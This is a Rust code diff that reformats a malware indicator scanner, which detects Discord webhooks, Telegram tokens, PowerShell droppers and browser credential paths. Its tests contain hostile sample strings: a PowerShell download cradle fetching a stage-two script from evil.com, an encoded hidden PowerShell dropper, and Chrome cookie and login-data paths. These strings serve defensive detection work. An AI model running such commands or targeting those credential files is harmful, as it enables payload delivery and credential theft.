@@ -101,16 +101,16 @@ fn utf16le_searcher() -> &'static AhoCorasick {
 fn discord_webhook_regex() -> &'static Regex {
     static RE: OnceLock<Regex> = OnceLock::new();
     RE.get_or_init(|| {
-        Regex::new(r"(?i)https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+")
-            .expect("Invalid discord regex")
+        Regex::new(
+            r"(?i)https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+",
+        )
+        .expect("Invalid discord regex")
     })
 }
 
 fn telegram_token_regex() -> &'static Regex {
     static RE: OnceLock<Regex> = OnceLock::new();
-    RE.get_or_init(|| {
-        Regex::new(r"\d{9,10}:[A-Za-z0-9_-]{35}").expect("Invalid telegram regex")
-    })
+    RE.get_or_init(|| Regex::new(r"\d{9,10}:[A-Za-z0-9_-]{35}").expect("Invalid telegram regex"))
 }
 
 fn powershell_dropper_regex() -> &'static Regex {
@@ -137,7 +137,7 @@ fn btc_wallet_bytes_regex() -> &'static regex::bytes::Regex {
 }
 
 fn is_printable_ascii(b: u8) -> bool {
-    b >= 0x20 && b <= 0x7E
+    (0x20..=0x7E).contains(&b)
 }
 
 /// Convert contiguous UTF-16LE byte sequences around a match to a String.
@@ -145,7 +145,7 @@ fn extract_utf16le_around(data: &[u8], match_start: usize, match_end: usize) -> 
     let mut start = match_start;
     while start >= 2 && (match_start - start) < 512 {
         let code = u16::from_le_bytes([data[start - 2], data[start - 1]]);
-        if code >= 0x20 && code <= 0x7E {
+        if (0x20..=0x7E).contains(&code) {
             start -= 2;
         } else {
             break;
@@ -154,7 +154,7 @@ fn extract_utf16le_around(data: &[u8], match_start: usize, match_end: usize) -> 
     let mut end = match_end;
     while end + 2 <= data.len() && (end - match_end) < 512 {
         let code = u16::from_le_bytes([data[end], data[end + 1]]);
-        if code >= 0x20 && code <= 0x7E {
+        if (0x20..=0x7E).contains(&code) {
             end += 2;
         } else {
             break;
@@ -162,8 +162,10 @@ fn extract_utf16le_around(data: &[u8], match_start: usize, match_end: usize) -> 
     }
     let slice = &data[start..end];
     let u16_chars: Vec<u16> = slice
-        .chunks_exact(2)
-        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .as_chunks::<2>()
+        .0
+        .iter()
+        .map(|&c| u16::from_le_bytes(c))
         .collect();
     String::from_utf16_lossy(&u16_chars)
 }
@@ -246,18 +248,19 @@ pub fn scan_iocs(data: &[u8]) -> Vec<Evidence> {
         } else {
             // Credential path / database file target
             let lower_extracted = extracted.to_lowercase();
-            let is_valid_cred_target = if lower_matched.contains("cookies") && !lower_matched.contains("sqlite") {
-                lower_extracted.contains("network\\cookies")
-                    || lower_extracted.contains("network/cookies")
-                    || lower_extracted.contains("\\cookies")
-                    || lower_extracted.contains("/cookies")
-                    || lower_extracted.contains("user data")
-                    || lower_extracted.contains("default")
-                    || lower_extracted.contains("profile")
-                    || lower_extracted.contains("appdata")
-            } else {
-                true
-            };
+            let is_valid_cred_target =
+                if lower_matched.contains("cookies") && !lower_matched.contains("sqlite") {
+                    lower_extracted.contains("network\\cookies")
+                        || lower_extracted.contains("network/cookies")
+                        || lower_extracted.contains("\\cookies")
+                        || lower_extracted.contains("/cookies")
+                        || lower_extracted.contains("user data")
+                        || lower_extracted.contains("default")
+                        || lower_extracted.contains("profile")
+                        || lower_extracted.contains("appdata")
+                } else {
+                    true
+                };
 
             if is_valid_cred_target {
                 evidence.push(Evidence {
@@ -331,18 +334,19 @@ pub fn scan_iocs(data: &[u8]) -> Vec<Evidence> {
             }
         } else {
             let lower_extracted = extracted.to_lowercase();
-            let is_valid_cred_target = if lower_matched.contains("cookies") && !lower_matched.contains("sqlite") {
-                lower_extracted.contains("network\\cookies")
-                    || lower_extracted.contains("network/cookies")
-                    || lower_extracted.contains("\\cookies")
-                    || lower_extracted.contains("/cookies")
-                    || lower_extracted.contains("user data")
-                    || lower_extracted.contains("default")
-                    || lower_extracted.contains("profile")
-                    || lower_extracted.contains("appdata")
-            } else {
-                true
-            };
+            let is_valid_cred_target =
+                if lower_matched.contains("cookies") && !lower_matched.contains("sqlite") {
+                    lower_extracted.contains("network\\cookies")
+                        || lower_extracted.contains("network/cookies")
+                        || lower_extracted.contains("\\cookies")
+                        || lower_extracted.contains("/cookies")
+                        || lower_extracted.contains("user data")
+                        || lower_extracted.contains("default")
+                        || lower_extracted.contains("profile")
+                        || lower_extracted.contains("appdata")
+                } else {
+                    true
+                };
 
             if is_valid_cred_target {
                 evidence.push(Evidence {
@@ -438,7 +442,10 @@ mod tests {
         assert!(!evidence.is_empty());
         assert!(evidence.iter().any(|e| matches!(
             &e.kind,
-            EvidenceKind::TelegramToken { encoding: StringEncoding::Utf16Le, .. }
+            EvidenceKind::TelegramToken {
+                encoding: StringEncoding::Utf16Le,
+                ..
+            }
         )));
     }
 
@@ -450,21 +457,27 @@ mod tests {
         sample.extend_from_slice(b" for read");
         let evidence = scan_iocs(&sample);
         assert!(!evidence.is_empty());
-        assert!(evidence.iter().any(|e| matches!(
-            &e.kind,
-            EvidenceKind::CredentialPath { .. }
-        )));
+        assert!(evidence
+            .iter()
+            .any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })));
     }
 
     #[test]
     fn test_case_insensitive_matching() {
-        let sample_lower = b"reading appdata\\local\\google\\chrome\\user data\\default\\login data";
+        let sample_lower =
+            b"reading appdata\\local\\google\\chrome\\user data\\default\\login data";
         let ev_lower = scan_iocs(sample_lower);
-        assert!(!ev_lower.is_empty(), "Lowercase path must be matched case-insensitively");
+        assert!(
+            !ev_lower.is_empty(),
+            "Lowercase path must be matched case-insensitively"
+        );
 
         let sample_upper = b"exporting WALLET.DAT and COOKIES.SQLITE";
         let ev_upper = scan_iocs(sample_upper);
-        assert!(!ev_upper.is_empty(), "Uppercase wallet and sqlite must be matched case-insensitively");
+        assert!(
+            !ev_upper.is_empty(),
+            "Uppercase wallet and sqlite must be matched case-insensitively"
+        );
     }
 
     #[test]
@@ -473,7 +486,9 @@ mod tests {
         let benign = b"class CookieStore { void loadCookies() { bool sameSiteCookies = true; bool clearCookies = false; } }";
         let ev_benign = scan_iocs(benign);
         assert!(
-            !ev_benign.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
+            !ev_benign
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
             "Generic cookie method/variable identifiers must NOT produce CredentialPath evidence"
         );
 
@@ -481,7 +496,9 @@ mod tests {
         let hostile = b"Accessing User Data\\Default\\Network\\Cookies for extraction";
         let ev_hostile = scan_iocs(hostile);
         assert!(
-            ev_hostile.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
+            ev_hostile
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
             "Explicit Network\\Cookies path must produce CredentialPath evidence"
         );
     }
@@ -499,19 +516,26 @@ mod tests {
         let ascii_sample = b"namespace System { class Convert { public static byte[] FromBase64String(string s) { return null; } } }";
         let ev_ascii = scan_iocs(ascii_sample);
         assert!(
-            !ev_ascii.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
+            !ev_ascii
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
             "Bare FromBase64String in ASCII must NOT produce PowerShellCommand evidence"
         );
         assert!(
-            !ev_ascii.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
+            !ev_ascii
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
             "Bare FromBase64String in ASCII must NOT produce CredentialPath evidence"
         );
 
         // UTF-16LE benign .NET API usage
-        let utf16_sample = to_utf16le_bytes("System.Convert.FromBase64String metadata in System.Data.dll");
+        let utf16_sample =
+            to_utf16le_bytes("System.Convert.FromBase64String metadata in System.Data.dll");
         let ev_utf16 = scan_iocs(&utf16_sample);
         assert!(
-            !ev_utf16.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
+            !ev_utf16
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
             "Bare FromBase64String in UTF-16LE must NOT produce PowerShellCommand evidence"
         );
         assert!(
@@ -526,7 +550,9 @@ mod tests {
         let ascii_dropper = b"cmd.exe /c powershell.exe -w hidden -enc JABhID0A...";
         let ev_ascii = scan_iocs(ascii_dropper);
         assert!(
-            ev_ascii.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
+            ev_ascii
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
             "Hidden/encoded PowerShell dropper in ASCII must produce PowerShellCommand evidence"
         );
 
@@ -534,7 +560,9 @@ mod tests {
         let utf16_cradle = to_utf16le_bytes("powershell -nop -c (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')");
         let ev_utf16 = scan_iocs(&utf16_cradle);
         assert!(
-            ev_utf16.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
+            ev_utf16
+                .iter()
+                .any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
             "PowerShell download cradle in UTF-16LE must produce PowerShellCommand evidence"
         );
     }
